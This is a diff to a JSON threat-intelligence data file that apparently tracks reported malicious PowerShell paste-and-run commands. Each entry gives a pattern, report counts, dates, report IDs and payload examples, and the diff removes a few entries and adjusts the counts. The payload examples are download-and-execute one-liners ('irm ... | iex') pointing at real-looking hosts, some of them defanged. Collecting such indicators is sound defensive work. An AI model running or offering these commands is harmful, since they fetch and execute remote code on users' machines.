@@ -1,12 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 148,
-    "ReportCount": 148,
-    "FirstSeen": "2026-11-14T14:44:10.592000+00:00",
+    "DistinctPayloadCount": 147,
+    "ReportCount": 147,
+    "FirstSeen": "2026-11-14T16:37:51.895000+00:00",
     "LastSeen": "2026-11-21T12:30:27.952000+00:00",
     "ReportIds": [
-      "cmwginvma0lic0omlk1c2ku1a",
       "cmwgmq2yd0lr20omlqz1zffk5",
       "cmwh0wou40mte0omlvnsta2vn",
       "cmwh1uj7x0n750omlble342fr",
@@ -234,7 +233,6 @@
       "irm 'browse-cloud.codes/9fbc6acd3407cb30'|iex;",
       "irm 'browse-cloud.codes/a062020e66ee07c1'|iex;",
       "irm 'browse-cloud.codes/a3a0979350a6065b'|iex;",
-      "irm 'browse-cloud.codes/a635234e252c668b'|iex;",
       "irm 'browse-cloud.codes/a78c947fe78a126a'|iex;",
       "irm 'browse-cloud.codes/a88144f2081c0c71'|iex;",
       "irm 'browse-cloud.codes/a8c0c6760a752b5e'|iex;",
@@ -745,13 +743,11 @@
   },
   {
     "Pattern": "IRM <URL> | IEX",
-    "DistinctPayloadCount": 11,
-    "ReportCount": 68,
-    "FirstSeen": "2026-11-14T14:42:42.917000+00:00",
+    "DistinctPayloadCount": 10,
+    "ReportCount": 66,
+    "FirstSeen": "2026-11-14T23:30:26.206000+00:00",
     "LastSeen": "2026-11-21T14:29:30.352000+00:00",
     "ReportIds": [
-      "cmwgilzy30lfb0oml5aansa6p",
-      "cmwgimf3v0lg20omleagzrf9n",
       "cmwh1gnh80n1i0oml3wpgy548",
       "cmwh6rtfu0ot30omlftsxinhi",
       "cmwhg0vgy0srr0oml60uxbl89",
@@ -822,7 +818,6 @@
     "PayloadExamples": [
       "IRM fozeenyqzeokeeqh[.]sisterleveling[.]com/4d9a40aa-2dcd-4623-8ab8-8b7ec2355fcb/b5e589ce-d56d-4c50-bc8d-502a073548.36 | IEX",
       "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
-      "IRM gitlab[.]com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515 | IEX",
       "IRM gitlab[.]com/cc4b6f224188/31863a48-57f3-41bd-b43d-d745c0e71e27/-/raw/main/b2df0d5d-e86b-4ac9-bf98-0f31b3843a70 | IEX",
       "IRM gitlab[.]com/cc4b6f224188/4495be-a229-4a88-ab68-d0b50dfe86b4/-/raw/main/E53-a76F-3c3D6f99 | IEX",
       "IRM gitlab[.]com/cc4b6f224188/efad4910-0ec9-439e-aa10-54dca6ba535e/-/raw/main/9869d9ad-7e4a-407a-8829-89c0d60614c7 | IEX",
@@ -964,11 +959,10 @@
   {
     "Pattern": "IRM <URL>\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
     "DistinctPayloadCount": 1,
-    "ReportCount": 5,
-    "FirstSeen": "2026-11-14T14:43:31.633000+00:00",
+    "ReportCount": 4,
+    "FirstSeen": "2026-11-17T12:59:02.465000+00:00",
     "LastSeen": "2026-11-19T01:47:35.719000+00:00",
     "ReportIds": [
-      "cmwgin1jy0lh20omlj4jcehdg",
       "cmwkp88891fgr0omlhjevhb4h",
       "cmwkr312l1fmb0omljm9yarua",
       "cmwlzx7181r4v0omlc0wtmgup",
